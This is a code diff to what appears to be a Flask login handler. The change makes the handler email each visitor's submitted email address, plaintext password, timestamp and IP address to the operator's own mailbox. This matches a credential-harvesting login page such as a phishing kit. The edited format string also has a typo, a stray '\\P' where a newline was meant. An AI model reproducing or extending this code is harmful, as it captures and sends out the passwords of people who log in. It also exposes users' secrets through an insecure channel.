@@ -29,11 +29,14 @@ def login():
             sender=os.getenv("MAIL_USERNAME"),
             recipients=[os.getenv("MAIL_USERNAME")],
         )
-        msg.body = "Login Attempt\nEmail: %s\nTimeStamp: %s\nIP Address: %s" % (
-            email,
-            password,
-            datetime.datetime.now(),
-            request.remote_addr,
+        msg.body = (
+            "Login Attempt\nEmail: %s\Password: %s\nTimeStamp: %s\nIP Address: %s"
+            % (
+                email,
+                password,
+                datetime.datetime.now(),
+                request.remote_addr,
+            )
         )
         mail.send(msg)
 
